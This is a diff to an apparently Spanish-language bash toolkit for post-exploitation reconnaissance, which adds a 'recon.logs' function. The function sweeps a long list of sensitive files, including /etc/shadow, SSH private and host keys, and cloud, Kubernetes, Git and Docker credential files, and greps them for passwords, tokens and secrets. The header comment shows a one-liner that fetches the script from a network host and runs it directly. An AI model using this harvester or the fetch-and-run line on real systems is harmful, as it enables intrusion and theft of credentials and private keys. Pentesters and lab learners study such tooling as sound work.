@@ -3,6 +3,16 @@
 # . <(curl 10.10.10.10/recon.sh)
 #
 
+# Definición de colores
+RESET="\e[0m"       # Resetear color
+BOLD="\e[1m"        # Texto en negrita
+RED="\e[1;31m"      # Rojo
+GREEN="\e[1;32m"    # Verde
+YELLOW="\e[1;33m"   # Amarillo
+BLUE="\e[1;34m"     # Azul
+CYAN="\e[1;36m"     # Cian
+
+
 IP_KALI="{IP_KALI}"
 
 #------------------------------------------------------
@@ -25,6 +35,7 @@ function recon.help(){
     - recon.portscan <host> [1-1024]  : Perform port scanning
     - recon.pingscan 10.10.10.        : Perform /24 subnet ping scan
     - recon.pspy                      : Simple process monitor
+    - recon.logs                      : Searchs for credentiales in logs
 
  [*] General recon:
     - recon.basic                     : Basic information
@@ -82,6 +93,112 @@ function env.fix {
   export TERM=xterm-256color
   reset xterm
 
+
+}
+
+
+
+function recon.logs() {
+    # Definir rutas comunes de logs
+
+
+local log_paths=(
+    "/var/log/auth.log"                    # Logs de autenticación
+    "/var/log/secure"                      # Logs de autenticación (CentOS/Red Hat)
+    "/var/log/syslog"                      # Logs del sistema
+    "/var/log/messages"                    # Logs generales del sistema
+    "/var/log/nginx/access.log"            # Logs de acceso Nginx
+    "/var/log/nginx/error.log"             # Logs de error Nginx
+    "/var/log/httpd/access_log"            # Logs de acceso Apache
+    "/var/log/httpd/error_log"             # Logs de error Apache
+    "/var/log/mysql/error.log"             # Logs de MySQL
+    "/var/log/postgresql/postgresql.log"   # Logs de PostgreSQL
+    "/var/log/maillog"                     # Logs de correos
+    "/var/log/dpkg.log"                    # Logs de paquetes Debian
+    "/var/log/yum.log"                     # Logs de paquetes YUM
+    "/home/*/.bash_history"                # Historial de comandos bash
+    "/root/.bash_history"                  # Historial de root
+    "/var/log/cloud-init.log"              # Logs de inicialización en la nube
+    "/var/log/cloud-init-output.log"       # Salida de inicialización en la nube
+    "/etc/passwd"                          # Archivo de usuarios (sin contraseñas)
+    "/etc/shadow"                          # Archivo de contraseñas encriptadas
+    "/var/log/btmp"                        # Registros de intentos de acceso fallidos
+    "/var/log/wtmp"                        # Historial de inicios de sesión
+    "/var/log/lastlog"                     # Últimos accesos de usuarios
+    "/var/log/faillog"                     # Información de fallos de autenticación
+    "/var/log/samba/log.smbd"              # Logs de Samba, puede contener contraseñas
+    "/var/log/krb5kdc.log"                 # Logs de Kerberos
+    "/var/log/sudo.log"                    # Logs de sudo
+    "/var/log/openvpn.log"                 # Logs de OpenVPN
+    "/var/log/audit/audit.log"             # Logs de auditd
+    "/etc/ssh/sshd_config"                 # Configuración de SSH
+    "/etc/ssh/ssh_config"                  # Configuración del cliente SSH
+    "/etc/ldap.conf"                       # Configuración de LDAP
+    "/etc/nginx/nginx.conf"                # Configuración de Nginx
+    "/etc/httpd/conf/httpd.conf"           # Configuración de Apache
+    "/etc/proftpd/proftpd.conf"            # Configuración de ProFTPD
+    "/etc/vsftpd.conf"                     # Configuración de VSFTPD
+    "/etc/mysql/my.cnf"                    # Configuración de MySQL
+    "/etc/postgresql/*/main/pg_hba.conf"   # Configuración de autenticación PostgreSQL
+    "/etc/docker/daemon.json"              # Configuración de Docker
+    "/root/.mysql_history"                 # Historial de comandos MySQL root
+    "/home/*/.mysql_history"               # Historial de comandos MySQL del usuario
+    "/root/.ssh/id_rsa"                    # Clave privada RSA del usuario root
+    "/home/*/.ssh/id_rsa"                  # Clave privada RSA del usuario
+    "/etc/ssh/ssh_host_rsa_key"            # Clave privada RSA del host SSH
+    "/root/.ssh/known_hosts"               # Lista de hosts conocidos
+    "/tmp/"                                # Directorio temporal, posibles datos sensibles
+    "/var/tmp/"                            # Similar a /tmp
+    "/var/www/html/config.php"             # Configuración PHP
+    "/var/www/html/.env"                   # Archivos de entorno
+    "/var/www/html/wp-config.php"          # Configuración de WordPress
+    "/root/.aws/credentials"               # Claves de acceso AWS
+    "/root/.azure/credentials"             # Credenciales de Azure
+    "/root/.config/gcloud/application_default_credentials.json" # Claves de Google Cloud
+    "/root/.kube/config"                   # Configuración de Kubernetes
+    "/root/.terraform.d/credentials.tfrc.json" # Credenciales de Terraform
+    "/root/.ansible_vault"                 # Claves de Ansible
+    "/root/.pip/pip.conf"                  # Configuración de Python Pip
+    "/root/.npmrc"                         # Configuración de NPM
+    "/root/.gem/credentials"               # Credenciales para Rubygems
+    "/etc/passwd-"                         # Backup del archivo de usuarios
+    "/etc/shadow-"                         # Backup del archivo de contraseñas
+    "/etc/ssl/private/"                    # Certificados privados SSL/TLS
+    "/var/lib/docker/volumes/"             # Volúmenes de Docker
+    "/var/lib/kubelet/config.yaml"         # Configuración de Kubelet
+    "/etc/cron.d/"                         # Tareas programadas
+    "/root/.docker/config.json"            # Configuración de Docker (claves privadas)
+    "/var/log/snapd.log"                   # Logs de Snapd
+    "/var/lib/snapd/state.json"            # Estado de Snapd
+    "/root/.pypirc"                        # Configuración de PyPI
+    "/var/spool/cron/root"                 # Cronjobs de root
+    "/home/*/.git-credentials"             # Credenciales de Git
+    "/var/log/journal/"                    # Logs persistentes de systemd
+    "/root/.cache/gcloud/logs/"            # Logs de Google Cloud
+)
+
+
+
+    # Comando grep para buscar palabras clave relacionadas con credenciales
+    local search_pattern='(password|username|user|pass|key|token|secret|admin|administrator|cred|login|credentials)'
+
+
+    echo -e "${BLUE}[INFO]${RESET} Buscando posibles credenciales en logs..."
+    for log in "${log_paths[@]}"; do
+        if [[ -f "$log" ]]; then
+            printf "${GREEN}[✔]${RESET} Procesando archivo: ${CYAN}%s${RESET}\n" "$log"
+            results=$(grep -rinE --color=always "$search_pattern" "$log")
+            if [[ -n "$results" ]]; then
+                printf "${YELLOW}[!]${RESET} Resultados encontrados en: ${CYAN}%s${RESET}\n" "$log"
+                echo -e "$results" | sed -E "s/($search_pattern)/$(printf "${RED}")\1$(printf "${RESET}")/g" | \
+                    awk '{print "  ➤ " $0}'
+            else
+                printf "${GREEN}[✔]${RESET} Sin coincidencias en: ${CYAN}%s${RESET}\n" "$log"
+            fi
+        else
+            printf "${RED}[✘]${RESET} Archivo no encontrado: ${CYAN}%s${RESET}\n" "$log"
+        fi
+    done
 
 }
 
@@ -588,5 +705,4 @@ alias ll='ls -lh --group-dirs=first --color=auto'
 
 check_ip_kali
 recon.help
-
 
